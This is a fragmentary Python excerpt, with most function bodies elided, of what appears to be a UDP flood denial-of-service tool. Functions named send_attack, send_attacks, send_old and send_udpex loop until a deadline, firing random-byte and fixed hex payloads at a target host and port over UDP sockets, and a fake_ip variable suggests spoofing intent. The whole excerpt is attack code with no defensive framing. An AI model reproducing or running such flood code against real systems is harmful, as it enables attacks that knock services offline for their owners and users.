...
fake_ip = 'https://google.com' #7e70fb9358aa833a
...
def send_attack():
	...
	while int(time.time()) < waktu_skrg:
		...
		s.sendto(Lexhex[0], (host, int(port)))
		s.sendto(Lexhex[2], (host, int(port)))
...
def send_attacks():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	size = random._urandom(1081) #15000
	pack = random._urandom(999)
	pay = b'\x08\x1eb\xda'
	hpayload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
	while int(time.time()) < waktu_skrg:
...
def send_old():
	...
	bytes = random._urandom(1081) #65507
...
def send_udpex():
	...
	lu = b''
	bytes = random._urandom(1081) #15000
	while int(time.time()) < waktu_skrg:
